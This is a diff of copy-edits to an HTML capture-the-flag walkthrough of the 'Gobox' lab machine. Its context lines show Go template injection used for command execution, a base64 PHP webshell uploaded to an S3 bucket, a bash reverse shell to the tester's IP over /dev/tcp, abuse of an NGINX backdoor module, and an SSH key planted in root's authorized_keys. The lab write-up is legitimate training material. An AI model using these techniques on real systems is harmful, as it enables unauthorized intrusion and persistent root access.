@@ -25,11 +25,11 @@
 <h4 id="tools">Tools</h4>
 <ul>
 <li>Nmap</li>
-<li>BurpSuite</li>
+<li>Burp Suite</li>
 </ul>
 <h2 id="reconnaissance">Reconnaissance</h2>
 <h3 id="nmap">Nmap</h3>
-<p>Full TCP scan using <code>nmap</code> discovers three open ports: SSH on port 22, two sites on port 80 and port 8080 which are handled by NGINX.</p>
+<p>Full TCP scan using <code>nmap</code> discovers three open ports: SSH on port 22, two sites on port 80 and port 8080, which are handled by NGINX.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
 $ fscan 10.10.11.113 gobox
 nmap -n -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.11.113 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
@@ -67,7 +67,7 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 <p><div class="img-container"><img src="imgs/image-20210907083526935.png" alt="image-20210907083526935"  /></div>
 </p>
 <p>When an email and a password is submitted, it outputs nothing.</p>
-<p>Poking with curl shows that it has extra HTTP header:  <code>X-Forwarded-Server: golang</code>.</p>
+<p>Poking with <code>curl</code> shows that it has extra HTTP header:  <code>X-Forwarded-Server: golang</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97» 
 $ curl -s -I http://10.10.11.113:8080       
 HTTP/1.1 <span class="m">200</span> OK
@@ -96,7 +96,7 @@ X-Forwarded-Server: golang
 <p><div class="img-container"><img src="imgs/image-20210907091141912.png" alt="image-20210907091141912"  /></div>
 </p>
 <h4 id="rce">RCE</h4>
-<p>Examining the source code reveals that there is a function (around line 27) that allows code execution to the underlying system. The function takes one parameter called <code>test</code> and pass it to the <code>exec.Command</code> function.</p>
+<p>Examining the source code reveals that there is a function (around line 27) that allows code execution on the underlying system. The function takes one parameter called <code>test</code> and pass it to the <code>exec.Command</code> function.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="o">...</span>
 <span class="kd">func</span> <span class="p">(</span><span class="nx">u</span> <span class="nx">User</span><span class="p">)</span> <span class="nf">DebugCmd</span><span class="p">(</span><span class="nx">test</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">string</span> <span class="p">{</span>
 	<span class="nx">ipp</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Split</span><span class="p">(</span><span class="nx">test</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
@@ -111,14 +111,14 @@ X-Forwarded-Server: golang
     <span class="p">}</span>
 <span class="p">}</span>
 <span class="o">...</span>
-</code></pre></div><p>Because it is an embedded method for <code>User</code> struct, and the struct is rendered by template engine, therefore I can just call it directly and pass in a sequence of OS command as its arguments (<code>{{.DebugCmd &quot;command&quot;}}</code> or <code>{{.DebugCmd &quot;command args&quot;}}</code>).</p>
+</code></pre></div><p>Because it is a method of struct <code>User</code>, and this struct is rendered by template engine, therefore I can just call it directly and pass in a sequence of OS command as its arguments (<code>{{.DebugCmd &quot;command&quot;}}</code> or <code>{{.DebugCmd &quot;command args&quot;}}</code>).</p>
 <p>For example <code>{{.DebugCmd &quot;cat /etc/passwd&quot;}}</code>.</p>
 <p><div class="img-container"><img src="imgs/image-20210907093537225.png" alt="image-20210907093537225"  /></div>
 </p>
 <p>The user is root, but I found out that I&rsquo;m inside a Docker container.</p>
 <p><div class="img-container"><img src="imgs/image-20210907095803677.png" alt="image-20210907095803677"  /></div>
 </p>
-<p>Based on <a href="https://pkg.go.dev/html/template">the documentation</a>, package <code>html/template</code> has autoescaping feature, so my bash reverse shell won&rsquo;t work even with double base64 encoding. Therefore, I created a Python wrapper script to leverage the code execution.</p>
+<p>Based on <a href="https://pkg.go.dev/html/template">the documentation</a>, package <code>html/template</code> has autoescaping feature, so my bash reverse shell won&rsquo;t work even with double base64 encoding. Therefore, I created a Python wrapper script to leverage this code execution.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">cmd</span>
@@ -188,7 +188,7 @@ PRE css/
 2021-09-07 07:32:42     <span class="m">165551</span> header.png
 2021-09-07 07:32:42          <span class="m">5</span> index.html
 2021-09-07 07:32:42       <span class="m">1803</span> index.php
-</code></pre></div><p>When I read the contents of <code>index.php</code> file, I&rsquo;m sure it&rsquo;s the source of the homepage (port 80).</p>
+</code></pre></div><p>When I read the contents of <code>index.php</code> file, I&rsquo;m sure it&rsquo;s the source code of the homepage (port 80).</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; aws s3 cp s3://website/index.php /tmp/id.php
 download: s3://website/index.php to ../../tmp/id.php<span class="o">)</span> remaining
 &gt; cat /tmp/id.php
@@ -202,7 +202,7 @@ download: s3://website/index.php to ../../tmp/id.php<span class="o">)</span> rem
   &lt;title&gt;Hacking eSports <span class="p">|</span> <span class="o">{{</span>.Title<span class="o">}}</span>&lt;/title&gt;
   &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&#34;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;bootstrap-css&#34;</span>&gt;
 ...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><p>I also have write access to that bucket.</p>
+</code></pre></div><p>I also find that I have write access on this bucket.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">&gt; <span class="nb">echo</span> <span class="s1">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span> &gt; /tmp/iamf.php
 upload: ../../tmp/iamf.php to s3://website/iamf.phple<span class="o">(</span>s<span class="o">)</span> remaining
 &gt; aws s3 cp /tmp/iamf.php s3://website/
@@ -220,11 +220,11 @@ PD9waHAgZWNobyAiPHByZT4iOyBzeXN0ZW0oJF9HRVRbZl0pID8+Cg<span class="o">==</span>
 
 &gt; aws s3 cp /tmp/iamf-shell.php s3://website/iamf-shell.php
 upload: ../../tmp/iamf-shell.php to s3://website/iamf-shell.phpg
-</code></pre></div><p>And my webshell is accessible on the homepage site.</p>
+</code></pre></div><p>And my webshell is now accessible on the homepage site.</p>
 <p><div class="img-container"><img src="imgs/image-20210908163727213.png" alt="image-20210908163727213"  /></div>
 </p>
 <h4 id="reverse-shell">Reverse Shell</h4>
-<p>This time the system has several Linux binary such as <code>curl</code> that I can use to get a foothold. First, I will craft my reverse shell scriptand host it afterwards.</p>
+<p>This time the system has several Linux binary such as <code>curl</code> that I can use to get a foothold. First, I will craft my reverse shell script and host it afterwards.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97» 
 $ mkrev tun0 bash <span class="p">|</span> tee exploits/rce.sh
 bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.97/53 0&gt;&amp;1&#34;</span>
@@ -284,7 +284,7 @@ tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000
 tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
 tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
 tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
-</code></pre></div><p>I immediately inspect the NGINX configuration file under <code>/etc/nginx/sites-enabled/</code>. There is only one file there called <code>default</code> and it contains the following configurations:</p>
+</code></pre></div><p>I immediately inspected the NGINX configuration file under <code>/etc/nginx/sites-enabled/</code>. There is only one file there called <code>default</code> and it contains the following configurations:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="c1"># LocalStack that simulates AWS S3
 </span><span class="c1"></span><span class="k">server</span> <span class="p">{</span>
         <span class="kn">listen</span> <span class="mi">4566</span> <span class="s">default_server</span><span class="p">;</span>
@@ -339,7 +339,8 @@ tcp6       <span class="m">0</span>      <span class="m">0</span> :::22         
                 <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
         <span class="p">}</span>
 <span class="p">}</span>
-</code></pre></div><p>The server that listens on port 4566 is routed into the internal port 9000 which is mapped into the LocalStack container (host:4566 [with auth]-&gt;host:9000-&gt;container-localstack:4566). To confirm that, I run another scan against port 4566, and nmap shows that it&rsquo;s open and it&rsquo;s forbidden because the authorization check.</p>
+</code></pre></div><p>Based on the configuration above and the <code>docker-compose.yml</code> file I found under <code>/opt/website/</code>, the server that listens on port 4566 is routed into the internal port 9000 which is mapped into the LocalStack container (host:4566 [with auth]-&gt;host:9000-&gt;container-localstack:4566).</p>
+<p>To confirm that, I run another scan against port 4566, and <code>nmap</code> shows that it&rsquo;s open and it&rsquo;s forbidden because the authorization check.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
 $ nmap -sV -sC -p4566 10.10.11.113
 Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-08 06:51 EDT
@@ -428,7 +429,7 @@ drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <s
 -rw-r--r-- <span class="m">1</span> root root  <span class="m">180</span> Feb  <span class="m">4</span>  <span class="m">2019</span> proxy_params
 -rw-r--r-- <span class="m">1</span> root root  <span class="m">636</span> Feb  <span class="m">4</span>  <span class="m">2019</span> scgi_params
 -rw-r--r-- <span class="m">1</span> root root  <span class="m">664</span> Feb  <span class="m">4</span>  <span class="m">2019</span> uwsgi_params
-</code></pre></div><p>When I visit the <code>modules-enabled</code> folder, I find a module with a suspicious name, &ldquo;backdoor&rdquo; !</p>
+</code></pre></div><p>When I visit the <code>modules-enabled</code> folder, I find a module with a suspicious name, &ldquo;backdoor&rdquo;!</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ ls -l modules-enabled
 total <span class="m">12</span>
 -rw-r--r-- <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 20:50 50-backdoor.conf
@@ -436,14 +437,14 @@ lrwxrwxrwx <span class="m">1</span> root root <span class="m">61</span> Aug <spa
 lrwxrwxrwx <span class="m">1</span> root root <span class="m">60</span> Aug <span class="m">23</span> 14:43 50-mod-http-xslt-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
 lrwxrwxrwx <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 14:43 50-mod-mail.conf -&gt; /usr/share/nginx/modules-available/mod-mail.conf
 lrwxrwxrwx <span class="m">1</span> root root <span class="m">50</span> Aug <span class="m">23</span> 14:43 50-mod-stream.conf -&gt; /usr/share/nginx/modules-available/mod-stream.conf
-</code></pre></div><p>The module load a <code>.so</code> file called <code>ngx_http_execute_module.so</code>. I find that file under <code>/usr/lib/nginx/modules/</code>.</p>
+</code></pre></div><p>The module loads a <code>.so</code> file called <code>ngx_http_execute_module.so</code>. I found that file under <code>/usr/lib/nginx/modules/</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ cat modules-enabled/50-backdoor.conf
 load_module modules/ngx_http_execute_module.so
 www-data@gobox:/etc/nginx$ find / -type f -name <span class="s2">&#34;ngx_http_execute_module.so&#34;</span> 2&gt;/dev/null
 /usr/lib/nginx/modules/ngx_http_execute_module.so
 www-data@gobox:/etc/nginx$ file /usr/lib/nginx/modules/ngx_http_execute_module.so
 /usr/lib/nginx/modules/ngx_http_execute_module.so: ELF 64-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, BuildID<span class="o">[</span>sha1<span class="o">]=</span>4279ae42bf642b21378aa43c06b52f4d0b89f2ad, with debug_info, not stripped
-</code></pre></div><p>I try to find the origin of this module by grabbing some readable code using  <code>strings</code>. It turns out the backdoor is taken from this Github repository: <a href="https://github.com/limithit/NginxExecute">NginxExecute</a>.</p>
+</code></pre></div><p>I&rsquo;m trying to find the origin of this module by grabbing some readable code using  <code>strings</code>. It turns out the backdoor is taken from this Github repository: <a href="https://github.com/limithit/NginxExecute">NginxExecute</a>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.97»
 $ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;.c$&#39;</span>
 ngx_pcalloc
@@ -455,58 +456,8 @@ ngxexecute_strcpy_alloc
 ~iHc
 /home/ubuntu/NginxExecute//ngx_result.c
 7src
-!w<span class="s2">&#34;c
-</span><span class="s2">I%&amp;c
-</span><span class="s2">I=&amp;c
-</span><span class="s2">?src
-</span><span class="s2">3src
-</span><span class="s2">3src
-</span><span class="s2">ngx_http_execute_module.c
-</span><span class="s2">ngx_process.c
-</span><span class="s2">ngx_result.c
-</span><span class="s2">ngx_http_execute_module_modules.c
-</span><span class="s2">ngx_pcalloc
-</span><span class="s2">pcre32_malloc
-</span><span class="s2">timespec
-</span><span class="s2">pcre_malloc
-</span><span class="s2">nalloc
-</span><span class="s2">start_msec
-</span><span class="s2">pcre16_malloc
-</span><span class="s2">async
-</span><span class="s2">pcre32_stack_malloc
-</span><span class="s2">tv_nsec
-</span><span class="s2">ngx_argc
-</span><span class="s2">pcre16_stack_malloc
-</span><span class="s2">valid_msec
-</span><span class="s2">/home/ubuntu/NginxExecute//ngx_http_execute_module.c
-</span><span class="s2">valid_sec
-</span><span class="s2">pcre_stack_malloc
-</span><span class="s2">tv_sec
-</span><span class="s2">ngx_current_msec
-</span><span class="s2">proc
-</span><span class="s2">start_sec
-</span><span class="s2">error_sec
-</span><span class="s2">updating_sec
-</span><span class="s2">__ctype_b_loc
-</span><span class="s2">/home/ubuntu/NginxExecute//ngx_process.c
-</span><span class="s2">__src
-</span><span class="s2">ngxexecute_strncpy_alloc
-</span><span class="s2">ngxexecute_strcpy_alloc
-</span><span class="s2">realloc
-</span><span class="s2">/home/ubuntu/NginxExecute//ngx_result.c
-</span><span class="s2">objs/ngx_http_execute_module_modules.c
-</span><span class="s2">crtstuff.c
-</span><span class="s2">ngx_http_execute_module.c
-</span><span class="s2">ngx_process.c
-</span><span class="s2">ngx_result.c
-</span><span class="s2">ngx_http_execute_module_modules.c
-</span><span class="s2">ngxexecute_strncpy_alloc
-</span><span class="s2">ngxexecute_strcpy_alloc
-</span><span class="s2">ngx_pcalloc
-</span><span class="s2">.plt.sec
-</span><span class="s2">.dynamic
-</span><span class="s2">.debug_loc
-</span></code></pre></div><h4 id="nginx-backdoor">NGINX Backdoor</h4>
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h4 id="nginx-backdoor">NGINX Backdoor</h4>
 <p>According to the README file from the repository, I just need to send a HTTP request with <code>?system.run[command]</code>, but it doesn&rsquo;t work here.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ curl -v <span class="s2">&#34;http://127.0.0.1:8000/?system.run[whoami]&#34;</span>
 *   Trying 127.0.0.1:8000...
@@ -530,7 +481,7 @@ root
 </code></pre></div><p>Using the previous reverse shell script on <code>/tmp/</code>, I could get an interactive shell access as root, but then the shell gets exited by itself.</p>
 <p><div class="img-container"><img src="imgs/image-20210908184311943.png" alt="image-20210908184311943"  /></div>
 </p>
-<p>So instead, I inject my SSH public key.</p>
+<p>So instead, I will inject my SSH public key.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39;</span> &gt; /tmp/iamf
 www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[cat /tmp/iamf | tee /root/.ssh/authorized_keys]&#34;</span>
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H
@@ -602,10 +553,10 @@ DROP       tcp  --  anywhere             anywhere             tcp dpt:9001
 DROP       tcp  --  anywhere             anywhere             tcp dpt:9000
 ...<span class="o">[</span>SNIP<span class="o">]</span>...
 </code></pre></div><p>Shouldn&rsquo;t it then return with <code>filtered</code> status?</p>
-<p>Well it was purely my mistake, I used <code>--min-rate=10000</code>. This could be the reason <code>nmap</code> misidentified the filtered port as closed.</p>
+<p>Well, I think it was purely my mistake. I used <code>--min-rate=10000</code>, so this could be the reason <code>nmap</code> misidentified the filtered port as closed.</p>
 <h3 id="gobox-request-routing">Gobox Request Routing</h3>
 <p>The first time I looked into the NGINX configuration file, it didn&rsquo;t make sense to me why my web shell is on the host OS? In fact, I uploaded my web shell to an S3 bucket, which is also a container.</p>
-<p>Now with root access obtained, I could understand what was happening. It was synchronization!</p>
+<p>Now, with root access obtained, I could understand what was happening, and it was synchronization.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# cat /var/spool/incron/root 
 /opt/deploy/.localstack/data/recorded_api_calls.json    IN_MODIFY       /usr/bin/aws --endpoint-url http://127.0.0.1:9000 s3 sync s3://website /opt/website
 /home/ubuntu/user.txt   IN_MODIFY       cp /home/ubuntu/user.txt /var/www/
